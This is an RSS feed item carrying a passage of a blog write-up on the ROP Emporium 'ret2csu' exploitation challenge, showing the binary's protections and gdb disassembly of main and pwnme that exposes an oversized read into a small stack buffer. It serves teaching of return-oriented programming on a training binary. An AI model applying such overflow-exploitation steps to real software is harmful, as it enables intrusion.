<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Solar Bits</title>
        <link>https://thuri10.github.io/</link>
        <description>Recent content on Solar Bits</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Mon, 20 Dec 2021 20:50:44 +0300</lastBuildDate><atom:link href="https://thuri10.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Return-Oriented Programming - Retcsu</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-retcsu/</link>
        <pubDate>Mon, 20 Dec 2021 20:50:44 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-retcsu/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/ropemporium/retcsu.jpg" alt="Featured image of post Return-Oriented Programming - Retcsu" /&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Challenge description&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We&amp;rsquo;re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them?
The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website &lt;a class=&#34;link&#34; href=&#34;https://ropemporium.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://ropemporium.com&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After downloading the binary, check the enabled protections and mitigation&amp;rsquo;s. Only &lt;strong&gt;NX&lt;/strong&gt; and Partial RELRO protections are turned on as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabledrop
    PIE:      No PIE &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First step is to find the vulnerability in the binary that will enable us to subvert the program execution control flow. From the disassembly of the main function we are only calling &lt;strong&gt;pwnme&lt;/strong&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;main&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;main&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400607&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400608&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040060b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400500&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;pwnme@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400610&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    eax,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400615&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400616&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function reference the got table in order to load the actual address of pwnme function from &lt;strong&gt;libret2csu.so&lt;/strong&gt; library after the first call.&lt;/p&gt;
&lt;h2 id=&#34;pwnme-disassembly&#34;&gt;pwnme Disassembly&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;:
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000093a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000093b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000093e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;sub&lt;/span&gt;    rsp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000942&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rax,&lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x201697&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x201fe0&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000949&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rax,&lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rax]
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000094c&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    ecx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000951&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x2&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000956&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    esi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000095b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;33&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdi,rax
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000095e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;36&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x820&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;setvbuf@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000963&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x31e&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xc88&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000096a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x7a0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000096f&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;53&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x32a&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xca0&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000976&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x7a0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000097b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rax,[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;]
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000097f&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000984&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    esi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000989&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdi,rax
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000098c&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;82&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x7d0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;memset@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000991&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x310&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xca8&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000998&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;94&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x7a0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000099d&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x36e&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xd12&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009a4&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;106&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    eax,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009a9&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x7c0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;printf@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009ae&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rax,[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;]
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009b2&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;120&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x200&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009b7&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;125&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rsi,rax
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009ba&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009bf&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;133&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x7f0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;read@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
